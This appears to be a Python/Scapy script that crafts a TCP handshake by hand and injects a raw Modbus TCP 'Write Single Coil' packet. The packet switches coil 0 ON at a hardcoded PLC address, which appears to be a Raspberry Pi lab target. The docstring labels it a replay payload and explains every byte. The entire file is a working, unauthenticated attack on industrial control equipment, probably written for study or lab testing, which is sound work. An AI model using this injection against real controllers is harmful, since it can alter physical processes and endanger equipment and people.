#Libraries
from scapy.all import *
from scapy.layers.inet import *

# Hardcoded values: PLC (RPI)
MODBUS_SERVER_IP = "192.168.68.117"
MODBUS_PORT = 502

"""
Modbus TCP Replay Payload
Unit ID: 1, Function: 0x05 (Write Single Coil), Coil Address: 0x0000, Value: 0xFF00 (ON)
Building payload: MBAP header + PDU
b' => indicates its in bytes
| Bytes (Hex) | Field          | Value          |
| ----------- | -------------- | -------------- |
| `00 01`     | Transaction ID | 1              |
| `00 00`     | Protocol ID    | 0              |
| `00 06`     | Length         | 6 bytes (rest) |
| `01`        | Unit ID        | 1              |
| Bytes (Hex) | Meaning                         |
| ----------- | --------------------------------|
| `05`        | Function code: Write Single Coil|
| `00 00`     | Coil address: 0                 |
| `FF 00`     | Value: `0xFF00` =   Turn ON     |
"""

modbus_payload = b'\x00\x01\x00\x00\x00\x06\x01\x05\x00\x00\xff\x00'

# Random source port
sport = RandShort()

# IP and initial TCP SYN
ip = IP(dst=MODBUS_SERVER_IP)
syn = TCP(sport=sport, dport=MODBUS_PORT, flags="S", seq=1000)
syn_ack = sr1(ip/syn, timeout=2)

if syn_ack and syn_ack.haslayer(TCP) and syn_ack[TCP].flags == "SA":
    ack = TCP(sport=sport, dport=MODBUS_PORT, flags="A", seq=syn_ack.ack, ack=syn_ack.seq + 1)
    send(ip/ack)

    # Now send PSH+ACK with payload
    psh = TCP(sport=sport, dport=MODBUS_PORT, flags="PA", seq=syn_ack.ack, ack=syn_ack.seq + 1)
    send(ip/psh/Raw(load=modbus_payload))

    print("Modbus payload sent.")
else:
    print("Failed to complete TCP handshake — is the Modbus server reachable?")